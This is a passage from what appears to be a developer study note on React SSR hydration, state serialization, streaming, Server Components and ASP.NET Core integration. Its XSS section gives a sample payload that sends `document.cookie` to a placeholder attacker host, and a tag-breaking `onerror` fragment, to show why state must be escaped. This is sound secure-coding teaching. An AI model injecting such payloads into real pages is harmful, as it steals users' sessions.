- The contract: the **first client render pass** must produce exactly the server's HTML. Everything after that pass is unconstrained.
- Causes cluster into: non-determinism (time, randomness), environment divergence (`typeof window`, browser APIs, locale), data drift, **invalid HTML nesting** (the browser rewrites the DOM, so React can never match), extensions, stray whitespace, and `identifierPrefix` drift.
- On mismatch React regenerates the subtree client-side: ==you lose the SSR benefit for that subtree==, get a flash, and lose focus/scroll/input. React 19 reports it as a single message with a diff instead of React 18's warning cascade.
- Four fixes: **A** `useEffect`+state two-pass (costs a double render), **B** `suppressHydrationWarning` (one leaf, cosmetic only, does *not* patch the DOM), **C** `useSyncExternalStore` + `getServerSnapshot` (best for stores; no second pass), **D** fix the invalid markup.
- Treat mismatches as bugs. In the worst case handlers attach to the wrong elements.
```

## 📦 6. Data and State Transfer

### 6.1. The problem

The server had to fetch data in order to render. If the client refetches on mount, three bad things happen at once:

```
Server:  fetch products → render HTML with 20 rows → send
Client:  hydrate → useEffect → fetch products AGAIN
           ❌ A duplicate round trip the user waits through
           ❌ A second load on your API for every page view
           ❌ If row 20 changed in between → HYDRATION MISMATCH
```

The fix is to send the data **alongside** the HTML so the client's first pass can reproduce the server's output exactly. This is precisely the "fetch data on the server so it's available *before* hydration" advice in [[Waterfall Effect]] — and the reason it kills the waterfall is that the data arrives in the *same response* as the HTML, so nothing has to be discovered by executing JavaScript first.

### 6.2. The `window.__INITIAL_STATE__` pattern

```jsx
// ---------- SERVER ----------
app.get('/products/:id', async (req, res) => {
  const product = await db.getProduct(req.params.id);
  const initialState = { product };

  const html = renderToString(<App initialState={initialState} />);

  res.send(`<!doctype html>
<html lang="en">
  <head><meta charset="utf-8" /><title>${escapeHtml(product.name)}</title></head>
  <body>
    <div id="root">${html}</div>
    <script>window.__INITIAL_STATE__ = ${serializeState(initialState)};</script>
    <script type="module" src="/assets/main.js"></script>
  </body>
</html>`);
});
```

```jsx
// ---------- CLIENT ----------
import { hydrateRoot } from 'react-dom/client';
import App from './App.jsx';

const initialState = window.__INITIAL_STATE__;
delete window.__INITIAL_STATE__;                 // don't leave it on the global

hydrateRoot(
  document.getElementById('root'),
  <App initialState={initialState} />
);
```

Because both sides receive the *same* `initialState`, the first client pass renders the same tree. No refetch, no waterfall, no mismatch.

```ad-important
title: Order matters
The `__INITIAL_STATE__` script must appear **before** the bundle script. Both are parsed in document order, so the global must already be assigned by the time `main.js` runs. With `renderToPipeableStream`, use `bootstrapScriptContent` for the state and `bootstrapScripts` for the bundle — React places them correctly for you.
```

### 6.3. 🔓 The XSS hazard — this is not optional

````ad-danger
title: 🔓 `JSON.stringify` alone is an XSS vulnerability
Inside a `<script>` tag you are not writing JSON — you are writing **JavaScript inside HTML**, and the HTML parser is looking for `</script` before the JS parser ever sees a character.

If any value in your state contains the literal text `</script>`, the browser closes your script tag early and treats whatever follows as **markup**:

```js
// An attacker sets their display name to:
const product = { name: '</script><script>fetch("//evil.com?c="+document.cookie)</script>' };

// Your server emits:
// <script>window.__INITIAL_STATE__ = {"name":"</script><script>fetch(...)</script>"};</script>
//                                                  ↑ tag closes HERE
```

Result: arbitrary attacker JavaScript on your origin, with your user's cookies and session. ==Any user-controllable string that reaches your state — a username, a product review, a search query — is an attack vector.==
````

The fix is to escape the characters that can terminate or open a tag. `\uXXXX` escapes are valid inside JS string literals and parse back to the identical characters, so the data is unchanged:

```js
// server/serializeState.js

const ESCAPE = {
  '<': '\\u003c',   // prevents </script> and <!-- and <script
  '>': '\\u003e',
  '/': '\\u002f',   // belt-and-braces for </
  '\u2028': '\\u2028',  // LINE SEPARATOR — a literal newline in JS strings
  '\u2029': '\\u2029',  // PARAGRAPH SEPARATOR — same problem
};

export function serializeState(state) {
  return JSON.stringify(state).replace(
    /[<>/\u2028\u2029]/g,
    (char) => ESCAPE[char]
  );
}
```

```ad-note
title: Why `\u2028` and `\u2029` are in that list
These two Unicode characters are treated as **line terminators** by JavaScript but not by JSON. An unescaped `U+2028` inside a string literal produces `SyntaxError: Invalid or unexpected token` and kills your whole bundle. They turn up in real text copied from Word, PDFs and some CMSs. This is a legendary, hard-to-reproduce production bug.
```

```ad-tip
Don't hand-roll this in production. Use a vetted library:
- `serialize-javascript` — also handles `Date`, `RegExp`, `Map`, `Set`, functions.
- `devalue` — handles cycles and rich types; used by SvelteKit.
- Or use a framework (Next.js, Remix/React Router, TanStack Start) that already does it.
```

### 6.4. The safer alternative — a JSON script tag

Putting the data in `<script type="application/json">` means the browser **never executes it**, so a stray `</script>` can at worst break parsing rather than run code.

```html
<script id="__INITIAL_STATE__" type="application/json">
  {"product":{"id":5,"name":"Wireless Mouse","price":29.99}}
</script>
```

```js
const el = document.getElementById('__INITIAL_STATE__');
const initialState = JSON.parse(el.textContent);
```

```ad-warning
title: Still escape `<`
`type="application/json"` removes the *code-execution* risk, not the *tag-termination* risk — the HTML tokenizer still hunts for `</script`. A payload containing `</script><img src=x onerror=...>` will close your tag and inject an element. So keep escaping `<` to `\u003c` (JSON parses `\u003c` straight back to `<`, so the data is lossless).

The JSON-script-tag approach is genuinely safer *and* CSP-friendly — it needs no `script-src` allowance for inline code — but it is not a licence to skip escaping.
```

```ad-tip
title: CSP
If you use inline `<script>` for state, a strict Content Security Policy will block it unless you add a nonce. Both streaming APIs accept a `nonce` option and apply it to the scripts React emits — pass the same nonce you put in your CSP header.
```

### 6.5. How real frameworks do it

You rarely write any of this yourself. For reference:

| Framework | Mechanism |
|---|---|
| **Next.js** (App Router) | Streams the RSC payload inline as `self.__next_f.push([...])` chunks |
| **Next.js** (Pages Router) | `<script id="__NEXT_DATA__" type="application/json">` from `getServerSideProps` |
| **React Router** / Remix | `window.__staticRouterHydrationData` from route `loader`s — see [[RouterProvider]] |
| **TanStack Query** | `dehydrate()` on the server → `<HydrationBoundary state={...}>` on the client |
| **Redux** | `configureStore({ preloadedState: window.__INITIAL_STATE__ })` — see [[Store]] |

```ad-note
title: TanStack Query and Redux call this "hydration" too
`HydrationBoundary`, `dehydrate`/`hydrate`, `preloadedState` — this is **data hydration**, a different thing from DOM hydration. See [[#🔀 10. Disambiguation — DOM Hydration vs Data Hydration|§10]].
```

```ad-summary
title: Section Summary
- The server already fetched the data; refetching on mount costs a round trip, doubles API load, and **causes mismatches** when the data drifted.
- Ship the data with the HTML: `window.__INITIAL_STATE__` or a `<script type="application/json">` tag, then feed the identical object to both `renderToString`/`renderToPipeableStream` and `hydrateRoot`.
- ==Never `JSON.stringify` straight into a `<script>` tag.== Escape `<` (and `>`, `/`) to `\uXXXX` or an attacker-supplied `</script>` becomes stored XSS. Escape `\u2028`/`\u2029` too, or valid text can break your bundle.
- `type="application/json"` removes code execution but **not** tag termination — keep escaping `<`.
- Put the state script **before** the bundle script; add a CSP `nonce` if you use inline scripts.
- This is the mechanism behind "fetch on the server so it's available before hydration" in [[Waterfall Effect]].
```

## 🏝️ 7. Partial, Selective and Progressive Hydration

All-at-once hydration has an obvious ceiling: the whole tree waits for the whole bundle, and the whole main thread is blocked while it works. Four escalating answers:

### 7.1. Streaming SSR with `<Suspense>`

`<Suspense>` marks a subtree as *non-blocking* — for both streaming **and** hydration.

```jsx
import { Suspense } from 'react';

function ProductPage({ id }) {
  return (
    <Layout>
      <Header />                      {/* shell — flushed immediately */}
      <ProductDetails id={id} />      {/* shell */}

      <Suspense fallback={<ReviewsSkeleton />}>
        <Reviews id={id} />           {/* slow — streamed in later */}
      </Suspense>

      <Suspense fallback={<RecsSkeleton />}>
        <Recommendations id={id} />   {/* slow — streamed in later */}
      </Suspense>
    </Layout>
  );
}
```

What the server sends, in order:

```
1. <Layout>, <Header>, <ProductDetails>, plus <ReviewsSkeleton>
   and <RecsSkeleton>                                  ← flushed at onShellReady
2. …reviews query resolves…
   Hidden div with the real <Reviews> HTML
   + inline <script> that swaps it into the skeleton's slot
3. …recommendations resolve…
   Same swap for <Recommendations>
```

```ad-important
> Streaming does not need to wait for React itself to load in the browser, or for your app to become interactive. The HTML content from the server will get progressively revealed before any of the `<script>` tags load.

The swap-in is done by tiny inline scripts React emits, ==not by React itself==. Content keeps filling in even while your 500 KB bundle is still downloading.
```

```ad-warning
title: What actually suspends
> Only data read from a source that activates a Suspense boundary, such as a Promise read with `use`, will suspend during rendering. Suspense does not detect data fetched inside an Effect or event handler.

`useEffect(() => { fetch(...) }, [])` **never suspends** and **never runs on the server**. Your SSR HTML will contain the empty/loading state. This is the #1 reason "I turned on SSR and my content still isn't in the HTML." See [[5.5 - Effect and Data Fetching]].
```

### 7.2. Selective hydration

`<Suspense>` boundaries are also **hydration** boundaries. Before React 18:

> you have to load the JavaScript for *all* components on the client before you can start hydrating *any* of them.

With `hydrateRoot` + Suspense, that's gone:

> React can hydrate parts as they're being loaded

so a `React.lazy` widget with a huge chunk no longer holds the entire page hostage. Two further properties matter:

**It yields to the browser.**

> hydrating content inside Suspense boundaries happens with tiny gaps in which the browser can handle events

so hydration no longer freezes the page on a low-end device.

**Interaction reorders the queue.** React hydrates in tree order — until the user clicks something that isn't hydrated yet:

> React will synchronously hydrate the comments during the capture phase of the click event

It hydrates the boundaries along the interaction path *first*, runs the handler, then goes back to the rest. React skips unrelated siblings, which

> creates an illusion that hydration is instant because components on the interaction path get hydrated first.

```ad-tip
title: Practical consequence
`<Suspense>` boundaries are not only loading UI — they are ==hydration priority units==. Wrapping a heavy, rarely-touched widget (a comments thread, a map, a chart) in its own boundary means:
- it streams separately,
- it hydrates separately,
- and if the user clicks it first, it jumps the queue.

Boundary placement is a performance decision, not just a UX one.
```

The general rule React states:

> React starts hydrating everything as early as possible, and it prioritizes the most urgent part of the screen based on the user interaction.

### 7.3. Islands architecture (Astro) — the extreme case

Selective hydration still assumes *everything eventually hydrates*. Islands architecture rejects that premise: **most of the page is permanently static HTML**, and only marked components ever get JavaScript.

```astro
---
// src/pages/blog/[slug].astro  — Astro
import Header from '../components/Header.astro';      // zero JS, ever
import Comments from '../components/Comments.jsx';     // React island
import SearchBox from '../components/SearchBox.jsx';   // React island
---
<Header />
<article set:html={post.html} />          <!-- pure HTML, no JS -->

<SearchBox client:load />                 <!-- hydrate immediately -->
<Comments client:visible />               <!-- hydrate when scrolled into view -->
```

Astro ships **zero** JavaScript by default. Each `client:*` directive is an explicit opt-in:

| Directive | When the island hydrates |
|---|---|
| `client:load` | Immediately on page load |
| `client:idle` | When the main thread is idle (`requestIdleCallback`) |
| `client:visible` | When it scrolls into the viewport (`IntersectionObserver`) |
| `client:media={query}` | When a media query matches |
| `client:only="react"` | Skip SSR entirely — client-render only |

```ad-note
title: Why this is the extreme case
SSR + full hydration: **100%** of the tree hydrates.
Selective hydration: 100% hydrates, but in a smart order.
Islands: maybe **5%** hydrates, and the rest is HTML forever.

The trade-off is that islands are isolated. Shared client state across islands needs an external store (nanostores, a signal library) — you can't just lift state up, because there is no common React root. That's a real constraint, and the reason islands suit content sites far better than apps.
```

### 7.4. React Server Components — components that never hydrate

RSC is the current direction of travel. A Server Component renders *ahead of bundling*, in an environment separate from both your client app and your SSR server.

```jsx
// app/posts/[slug]/page.jsx  — a Server Component (no "use client")
import { marked } from 'marked';            // never enters the client bundle
import sanitizeHtml from 'sanitize-html';   // never enters the client bundle
import LikeButton from './LikeButton.jsx';  // a Client Component

export default async function PostPage({ params }) {
  const post = await db.posts.findBySlug(params.slug);   // direct DB access

  return (
    <article>
      <h1>{post.title}</h1>
      <div dangerouslySetInnerHTML={{ __html: sanitizeHtml(marked(post.body)) }} />
      <LikeButton postId={post.id} initialCount={post.likes} />
    </article>
  );
}
```

```jsx
// app/posts/[slug]/LikeButton.jsx
'use client';                              // ← this is the hydration boundary
import { useState } from 'react';

export default function LikeButton({ postId, initialCount }) {
  const [count, setCount] = useState(initialCount);
  return <button onClick={() => setCount((c) => c + 1)}>♥ {count}</button>;
}
```

What the docs state about the client side of this:

> Server Components are not sent to the browser, so they cannot use interactive APIs like `useState`.

> the bundle does not include the expensive libraries needed to render the static content.

> the browser does not see the original `Note` and `Author` components; only the rendered output is sent to the client

So `marked` and `sanitize-html` — 75 KB gzipped in the docs' own example — never reach the user. Only `LikeButton` is bundled, and only `LikeButton` hydrates.

| | SSR | RSC |
|---|---|---|
| Where it runs | Your SSR server, per request | Separate env — build time **or** per request |
| Ships component code to the client? | ✅ Yes, all of it | ❌ Only `'use client'` components |
| Can use `useState` / `onClick`? | ✅ Yes | ❌ No (Server Components) |
| Hydrates? | ✅ Everything | Only the Client Components |
| Output | HTML | A serialised RSC payload (optionally then SSR'd to HTML) |

```ad-warning
title: Naming traps in this area
- `"use server"` marks **Server Actions**, not Server Components. There is no directive for Server Components — they are the default in an RSC-capable framework, and `"use client"` is what opts *out*.
- RSC and SSR are ==different layers, not alternatives==. Frameworks run both: Server Components render to an RSC payload, which is then server-rendered to HTML, which is then hydrated for the Client Components inside it.
- RSC needs framework and bundler support. You cannot bolt it onto a Vite SPA by upgrading React.
```

```ad-summary
title: Section Summary
- `<Suspense>` splits SSR into a fast **shell** plus streamed-in chunks; React's own inline scripts swap content in before your bundle even loads.
- ==`useEffect` fetching never suspends and never runs on the server== — it will not appear in your SSR HTML.
- Suspense boundaries double as **hydration** boundaries: React 18 hydrates them independently as chunks arrive, yields to the browser between them, and **synchronously hydrates the boundary the user just clicked** during the click's capture phase.
- **Islands** (Astro) invert the default: zero JS unless a `client:*` directive opts a component in. Cost: no shared React root, so cross-island state needs an external store.
- **RSC** goes further — Server Components aren't sent to the browser at all, so their code and dependencies never enter the bundle and never hydrate. Only `'use client'` subtrees do.
- Boundary placement is a performance decision: it controls streaming order *and* hydration priority.
```

## 🟣 8. The .NET Angle

This section matters if you build ASP.NET Core backends with React frontends. It also corrects the either/or framing in [[09 - Server-Side Rendering vs Client-Side Rendering]], which presents "SSR = Razor" vs "CSR = Web API + React" as the only two options. React SSR is a third thing that note doesn't cover.

### 8.1. The hard constraint

```ad-danger
title: 🧱 React SSR requires a JavaScript runtime on the server. Full stop.
`renderToPipeableStream` executes your components. Components are JavaScript. The CLR cannot run JavaScript.

So "React SSR from ASP.NET" always means ==ASP.NET talks to a Node process==, whether that process is in-proc, out-of-proc, or a separate service. There is no C#-native way to render a React tree.

This is a fundamentally different situation from Razor, where the renderer *is* the runtime you're already in.
```

### 8.2. What Microsoft used to ship, and its actual status

Be precise here — the naming is confusing and the internet gets it wrong constantly.

| Thing | Status |
|---|---|
| `Microsoft.AspNetCore.SpaServices` | **Obsoleted and removed.** Superseded by `.Extensions`. |
| `Microsoft.AspNetCore.NodeServices` | **Obsoleted and removed.** |
| `Microsoft.AspNetCore.SpaServices.Extensions` | **Still shipped** (packages exist for .NET 8/9/10) — but see the next row. |
| **The prerendering API inside `.Extensions`** — `SpaPrerenderingExtensions.UseSpaPrerendering`, `ISpaPrerenderer`, `AddSpaPrerenderer` | **Obsolete.** Attribute message: `[Obsolete("Prerendering is no longer supported out of box")]`. Docs stop at `aspnetcore-3.1`. ==No in-box replacement was ever shipped.== |
| `Microsoft.AspNetCore.SpaProxy` (current templates) | Supported — but **development-time only**, and **not SSR** (see §8.3). |

```ad-important
title: The nuance that gets mangled everywhere
It is **not** true that `Microsoft.AspNetCore.SpaServices.Extensions` is deprecated as a package — it still ships and `UseSpa` / `UseSpaStaticFiles` still work.

What *is* deprecated is specifically the **prerendering** piece: `UseSpaPrerendering` carries `[Obsolete("Prerendering is no longer supported out of box")]`, and its documentation was never published past ASP.NET Core 3.1.

So: ==ASP.NET Core has not had a supported in-box React prerendering story since 3.0.== If you inherit a codebase calling `UseSpaPrerendering`, it is on borrowed time and there is nothing in the box to migrate it to.
```

### 8.3. What `SpaProxy` and `UseSpaStaticFiles` actually do (spoiler: not SSR)

```ad-warning
Both current mechanisms are about **serving and proxying static assets**. Neither renders React on the server.

**`Microsoft.AspNetCore.SpaProxy`** (the .NET 6+ templates) is purely a *development* convenience. Wired up via `ASPNETCORE_HOSTINGSTARTUPASSEMBLIES` in `launchSettings.json` plus `<SpaProxyServerUrl>` / `<SpaProxyLaunchCommand>` in the `.csproj`, it launches your Vite/CRA dev server and coordinates the two processes. It does not exist in production.

**`UseSpaStaticFiles`** (the `.Extensions` route) is essentially a wrapper over `UseStaticFiles` that serves a second root (e.g. `ClientApp/dist`) alongside `wwwroot`. The modern equivalent is `MapFallbackToFile("index.html")`.

In production, the published SPA is ==just files in `wwwroot`== with a fallback route serving `index.html`. That is **CSR**: the browser still receives an empty `<div id="root">`.
```

```ad-note
title: Dev/prod divergence to be aware of
With the current templates the browser talks to the **frontend dev server**, which proxies `/api/*` back to Kestrel. In production there is no proxy — ASP.NET serves everything. Consequences worth knowing: behaviour differs between dev and prod, and features like HTTP/3, gRPC-Web, WebSockets and Windows authentication can behave differently through the dev-server proxy.
```

### 8.4. Your four realistic options

#### Option 1 — ASP.NET as a pure JSON API + Next.js for the frontend ⭐

Microsoft's own guidance points here: let the JS framework own SSR.

```
┌─────────────────────┐        ┌──────────────────────────┐
│  Next.js (Node)     │ HTTP   │  ASP.NET Core            │
│  • SSR + hydration  │ ─────► │  • Minimal API / Web API │
│  • RSC              │ JSON   │  • EF Core → MariaDB     │
│  • routing, SEO     │ ◄───── │  • auth, business logic  │
└─────────────────────┘        └──────────────────────────┘
        ▲
        │ HTML + hydration payload
     Browser
```

- ✅ Real SSR, streaming, RSC, ISR, first-class SEO.
- ✅ ASP.NET stays pure C# — no Node in your app process.
- ❌ Two runtimes to deploy, monitor and secure. Auth across the boundary needs thought (cookie forwarding, BFF pattern).
- ❌ An extra hop: browser → Next → ASP.NET → DB.

```ad-tip
If the Next.js app needs to call ASP.NET server-to-server, keep them in the same network/cluster so that hop is sub-millisecond. Otherwise you have reinvented the [[Waterfall Effect]] at the infrastructure layer.
```

#### Option 2 — Razor Pages / MVC, no React SSR

If server rendering is the requirement and React isn't, [[01 - What Razor Pages Are|Razor Pages]] gives you SSR natively with one runtime, one language, one deployment. No hydration, no mismatches, no Node.

#### Option 3 — Blazor

Blazor SSR (.NET 8+) plus interactive render modes gets you server-rendered HTML with C# interactivity. Blazor Server pushes diffs over SignalR; Blazor WebAssembly runs C# in the browser; Blazor Auto starts server-rendered and swaps to WASM. See the Blazor callout in [[09 - Server-Side Rendering vs Client-Side Rendering]].

```ad-note
Blazor's interactive render modes do something conceptually analogous to hydration — server-rendered markup becoming interactive — but the mechanism is entirely different (SignalR circuit or WASM runtime, not a JS bundle reconciling against DOM). Don't carry React hydration intuitions across.
```

#### Option 4 — The lightweight hybrid: Razor page + React island

This is the most practical middle ground for a .NET shop, and the one most likely to be mislabelled.

```html
@* Pages/Orders/Index.cshtml — Razor renders the page *@
@page
@model OrderIndexModel

<h1>Orders</h1>

<table class="table">
  @foreach (var order in Model.Orders)
  {
    <tr><td>@order.Id</td><td>@order.Customer</td></tr>
  }
</table>

@* React mounts ONLY into this div *@
<div id="order-editor"
     data-order-id="@Model.SelectedOrderId"
     data-api-base="/api"></div>

@section Scripts {
  <script type="module" src="~/js/order-editor.js" asp-append-version="true"></script>
}
```

```jsx
// wwwroot/js/order-editor.jsx  →  built to order-editor.js
import { createRoot } from 'react-dom/client';
import OrderEditor from './OrderEditor.jsx';

const el = document.getElementById('order-editor');

if (el) {
  // createRoot, NOT hydrateRoot — the div is empty; Razor never rendered React output.
  createRoot(el).render(
    <OrderEditor
      orderId={Number(el.dataset.orderId)}
      apiBase={el.dataset.apiBase}
    />
  );
}
```

```ad-danger
title: 🚫 This is NOT hydration — and the distinction is not pedantic
It *looks* like hydration: the server rendered HTML, then React took over part of the page. But:

| | Razor + React island | Real hydration |
|---|---|---|
| Who rendered the mount point's contents? | **Nobody** — `<div id="order-editor">` is empty | `react-dom/server` rendered it |
| Client API | `createRoot` | `hydrateRoot` |
| Does React reuse existing DOM? | No — it creates everything | Yes — it claims existing nodes |
| Can a mismatch occur? | ==**No — the concept doesn't apply**== | Yes, constantly |
| Node.js on the server? | **Not needed** | Required |
| React content in the first response? | No — it appears after JS runs | Yes |

**Hydration requires React HTML to hydrate.** Razor's HTML is *Razor's*, produced by a completely different renderer. React has no Fiber tree to align with it, so there is nothing to hydrate — React just mounts fresh into an empty container.

**Why the distinction is load-bearing:**
1. The React content is **not** in the first response, so ==this gives you no SEO benefit for the React part==. The Razor parts around it are indexed; the React island isn't. If you chose this thinking it fixed SEO, it didn't.
2. There is no mismatch class of bug, which makes it dramatically simpler to operate.
3. `useEffect` fetching inside the island is fine — no hydration contract to violate.
4. Conversely, if you ever *did* `hydrateRoot` a Razor-rendered div, you'd get mismatches on every single node.
```

```ad-tip
title: When Option 4 is the right call
Internal line-of-business apps — exactly the ASP.NET + React shape most .NET teams have. You get Razor's server-rendered navigation, forms, auth and layout, plus React only where the UI genuinely needs to be rich (a grid, a scheduler, a canvas editor). One runtime, no Node in production, no hydration bugs, and no SEO requirement to miss because the app is behind a login anyway.

This is islands architecture (§7.3) — ==implemented with Razor as the static generator instead of Astro==. It is a legitimate, underrated architecture, not a compromise.
```

```ad-summary
title: Section Summary
- React SSR **requires a JS runtime on the server**; the CLR cannot render React, so ASP.NET must delegate to Node.
- `SpaServices` and `NodeServices` are removed. `SpaServices.Extensions` still ships, but its **prerendering** API (`UseSpaPrerendering`) is `[Obsolete("Prerendering is no longer supported out of box")]` with no in-box replacement.
- `SpaProxy` is **dev-time only**; `UseSpaStaticFiles` / `MapFallbackToFile` are static-file serving. ==Neither is SSR== — production still ships an empty `<div id="root">`.
- Four options: **(1)** Next.js owns SSR, ASP.NET is a JSON API (Microsoft's guidance); **(2)** Razor Pages/MVC; **(3)** Blazor; **(4)** Razor page + React island via `createRoot`.
- Option 4 is **not hydration**: the mount div is empty, React uses `createRoot`, no Node is needed, mismatches cannot occur — and ==the React content is absent from the first response, so it gains nothing for SEO==.
```

## 🧮 9. When Is SSR + Hydration Actually Worth It

### 9.1. The rendering-strategy landscape

| | **CSR** | **SSR** | **SSG** | **ISR** |
|---|---|---|---|---|
| **HTML built** | In the browser, at runtime | On the server, **per request** | At **build** time | At build time, then **revalidated** |
| **Needs a JS server at runtime?** | No (CDN) | ✅ Yes | No (CDN) | ✅ Yes (Node runtime) |
| **TTFB** | Fastest | Slowest (renders per request) | Fastest | Fastest (cache hit) |
| **FCP / LCP** | Poor | Good | Best | Best |
| **Hydration needed?** | ❌ No (fresh mount) | ✅ Yes | ✅ Yes | ✅ Yes |
| **Content freshness** | Live | Live | Stale until rebuild | Stale up to `revalidate` |
| **Personalisation** | ✅ Easy | ✅ Easy | ❌ No | ❌ No (cached per path) |
| **Server cost / request** | ~0 | High (CPU per render) | ~0 | ~0 on hits |
| **SEO** | Weakest | ✅ Strong | ✅ Strongest | ✅ Strong |
| **Best for** | Dashboards, internal tools, editors | Feeds, search results, logged-in public pages | Docs, blogs, marketing | Catalogues, news, large content sites |

```ad-note
title: What ISR actually is
Incremental Static Regeneration is SSG plus background revalidation. A cached static page is served instantly; after the `revalidate` window a request triggers regeneration **in the background** while the stale page is still served, and the fresh one replaces it once built. Next.js frames the benefits as letting you "update static content without rebuilding the entire site" and "handle large amounts of content pages without long `next build` times".

Note that ==all of SSR, SSG and ISR need hydration==. They differ only in *when* the HTML was produced, not in what the client has to do with it.
```

### 9.2. The decision table

| Situation | SSR + hydration? | Why |
|---|---|---|
| Marketing site, landing pages | ✅ **Yes** (or SSG) | SEO and LCP are the entire product |
| Blog, docs, knowledge base | ✅ **SSG** | Content is static; no per-request server needed |
| E-commerce catalogue / PDP | ✅ **Yes (ISR)** | SEO-critical, high traffic, content changes but not per-user |
| News, feeds, search results | ✅ **SSR** | Fresh per request *and* indexable |
| Anything shared on Slack / social | ✅ **Yes** | ==Unfurlers don't run JS.== Nothing else works |
| Public pages, users on slow devices / 3G | ✅ **Yes** | Biggest win is exactly where JS is slowest |
| Public app with a mixed static/interactive page | ✅ **Islands / RSC** | Hydrate only what's interactive |
| **Admin panel behind a login** | ❌ **No** | Not crawlable. LCP matters far less than TTI |
| **Internal LOB / CRUD app** | ❌ **No** | No SEO, known devices, users keep the tab open all day |
| **Dashboard / analytics** | ❌ **No** | Data is user-specific and live; SSR renders a snapshot that instantly needs replacing |
| **Editor / IDE / design tool** | ❌ **No** | Heavy interactivity — you'd be optimising the metric that matters least |
| **Realtime app** (chat, trading) | ❌ **No** | Server HTML is stale before it arrives |
| Any app where you can't run Node in prod | ❌ **No** | Hard constraint (see §8.1) |

```ad-important
title: 🎯 Be honest: most CRUD apps behind auth do not need SSR
If your app is behind a login, then:
- **No crawler will ever see it.** The SEO argument — the strongest argument for SSR — evaluates to zero.
- Users authenticate once and keep the tab open. First-load LCP is amortised across hours of use; TTI and INP are what they feel all day.
- Every page is personalised, so caching gives you little.

Meanwhile you pay: a Node runtime in production, per-request CPU, a whole class of mismatch bugs, a more complex build, harder debugging (two environments), and ==worse TTI than plain CSR==.

**For the typical ASP.NET + React internal application, CSR is the correct engineering choice, not a shortcut.** Spend the effort on [[Code Splitting|code splitting]] and [[Optimize Bundle size with Code Splitting (React.lazy)|bundle size]] instead — that improves both LCP *and* TTI, for every user, with none of the operational cost.
```

```ad-tip
title: The cheapest 80%
Before adopting SSR for SEO, consider **prerendering just your public pages**. A handful of static marketing/landing routes generated at build time (SSG) gets you nearly all the SEO and social-preview benefit for a fraction of the complexity, while the authenticated app stays CSR. Many products should be exactly this shape.
```

```ad-summary
title: Section Summary
- **CSR / SSR / SSG / ISR** differ in *when* the HTML is produced; ==SSR, SSG and ISR all still require hydration==.
- SSR wins where content is public, indexable, shareable, or read on slow devices.
- SSR loses where content is private, personalised, live, or heavily interactive.
- **Most CRUD apps behind a login should stay CSR.** No crawler sees them, LCP amortises, and SSR makes TTI worse while adding a Node runtime and a new bug class.
- Cheapest high-value middle ground: **SSG your public pages, CSR your app.**
```

## 🔀 10. Disambiguation — DOM Hydration vs Data Hydration

```ad-question
title: ⚠️ "Hydration" means two different things, and this vault uses both
The word appears in this vault in two genuinely distinct senses. Mixing them up is one of the fastest ways to get confused when reading docs.

---

**① DOM hydration** — *the subject of this note.*

Attaching React to **existing server-rendered HTML**: walk the DOM, build the matching [[Fiber Tree]], claim the nodes, wire up the event system. The API is `hydrateRoot`. Requires SSR. Can produce **hydration mismatches**.

> Referenced in [[5.5 - SPA vs MPA]] ("Needs SSR or hydration for good indexing") and [[Waterfall Effect]] ("fetch data on the server so it's available *before* hydration").

---

**② Data hydration** *(a.k.a. "rehydration", "dehydrate/hydrate")* — *a different thing entirely.*

**Filling a client-side store, cache or router with data serialised from the server.** No DOM involved. No `hydrateRoot`. No mismatches. It's just "here is a JSON snapshot, populate yourself from it."

> This is the sense in [[RouterProvider]] — "Hydrates data into components" (what `useLoaderData` / `useActionData` read). Also TanStack Query's `dehydrate()` / `<HydrationBoundary>`, Redux's `preloadedState`, and Apollo's `cache.restore()`.

---

| | ① DOM hydration | ② Data hydration |
|---|---|---|
| **What gets hydrated** | The **DOM** | A **store / cache / router** |
| **API** | `hydrateRoot(container, <App />)` | `preloadedState`, `<HydrationBoundary>`, `cache.restore()`, router `loader` data |
| **Requires SSR?** | ✅ Yes, by definition | ❌ No — works fine in a pure SPA |
| **Mismatch risk?** | ✅ Yes | ❌ No |
| **Analogy** | Pouring water on a dried sponge so it works again | Pre-loading a form with saved values |

---

**How they relate:** they are *often used together*, which is why the vocabulary collapsed. A real SSR app does ② to make ① safe — you serialise the server's data (§6) so the client's first render pass reproduces the server's HTML and DOM hydration succeeds.

But either can exist alone:
- ① without ②: SSR a page with no data (a static About page).
- ② without ①: a CSR SPA whose router preloads `loader` data — [[RouterProvider]] in a Vite app does exactly this, and `hydrateRoot` never enters the picture.
```

```ad-tip
title: Reading rule of thumb
See `hydrateRoot`, `renderToString`, "hydration mismatch", "hydration error"? → sense ①.
See `dehydrate`, `HydrationBoundary`, `preloadedState`, `loader`, "hydrate the cache/store"? → sense ②.
```

```ad-summary
title: Section Summary
- **DOM hydration** = `hydrateRoot` attaching React to server HTML. Needs SSR. Mismatches possible. The subject of this note.
- **Data hydration** = populating a store/cache/router from serialised server data. No DOM, no SSR requirement, no mismatches. The sense used in [[RouterProvider]].
- They're usually combined — ② is *how you make* ① safe — but each works without the other.
```

## 🐛 11. Common Gotchas

```ad-warning
title: 🐛 The list, roughly in order of how often it bites people
**1. Using `createRoot` instead of `hydrateRoot`.** Silently discards all server HTML. No error, no warning, worse than plain CSR. Check your client entry file first when SSR "isn't working".

**2. Expecting `useEffect` data to appear in the SSR HTML.** Effects never run on the server. Your HTML will contain the loading state — which is what the crawler indexes. Fetch on the server and pass the data down (§6), or use a Suspense-compatible source.

**3. `renderToString` + `React.lazy`/`Suspense`.** Emits the **fallback**, not the content. Your "SEO fix" ships a skeleton loader as your indexed page content.

**4. Invalid HTML nesting.** Works perfectly in CSR, explodes under SSR, because the browser's parser silently rewrites the DOM. `<div>` in `<p>`, bare `<tr>`, nested `<a>`. Impossible to spot by reading the JSX.

**5. `JSON.stringify` straight into a `<script>` tag.** Stored XSS via `</script>` in any user-controlled string. Escape `<` to `\u003c`. And escape `\u2028`/`\u2029` or real-world text will break your bundle with a `SyntaxError`.

**6. Reading `localStorage` / `window` / `document` / `navigator` during render.** Throws on the server (or diverges if guarded). Move it into an effect, or use `useSyncExternalStore` with `getServerSnapshot`.

**7. `typeof window !== 'undefined'` in render logic.** This is *designed* to diverge; it guarantees a mismatch. Guard **effects**, not render output.

**8. `suppressHydrationWarning` as a general remedy.** Only works one level deep, does **not** patch the DOM (users keep seeing the server's value), and destroys the warning that would have surfaced the next real bug.

**9. Mismatched `identifierPrefix`.** Pass the same value to the server renderer *and* `hydrateRoot`, or every `useId()` disagrees.

**10. Pretty-printing your HTML template.** Newlines and indentation around the React output *inside* the root node become text nodes React never rendered. Documented mismatch cause.

